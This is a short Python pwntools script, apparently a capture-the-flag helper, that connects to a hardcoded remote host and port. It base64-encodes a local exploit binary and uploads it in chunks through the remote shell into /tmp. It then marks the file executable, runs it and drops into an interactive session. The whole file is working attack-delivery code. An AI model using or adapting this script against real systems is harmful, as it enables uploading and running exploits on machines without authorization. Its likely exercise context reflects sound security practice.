#!/usr/bin/python3.8

from pwn import *


EXPLOIT_PATH = '/tmp/exploit'

SERVER = "47.94.200.88"
PORT = 23333

SHELL_PROMPT = '$ '


def get_splitted_encoded_exploit():
    split_every = 256
    # Change the name to your exploit path
    with open('./core/exp', 'rb') as exploit_file:
        exploit = base64.b64encode(exploit_file.read())
    return [exploit[i:i+split_every] for i in range(0, len(exploit), split_every)]


def upload_exploit(sh):
    chunks_sent = 0
    splitted_exploit = get_splitted_encoded_exploit()
    for exploit_chunk in splitted_exploit:
        print(f'[*] Sending a chunk ({chunks_sent}/{len(splitted_exploit)})')
        sh.sendlineafter(
            SHELL_PROMPT, f'echo {exploit_chunk.decode()} | base64 -d >> {EXPLOIT_PATH}')
        chunks_sent += 1

r = remote(SERVER, PORT)
upload_exploit(r)
# When finished, your exploit will be in /tmp directory. Good luck.
r.sendline("cd /tmp && chmod +x ./exploit && ./exploit")
r.interactive()
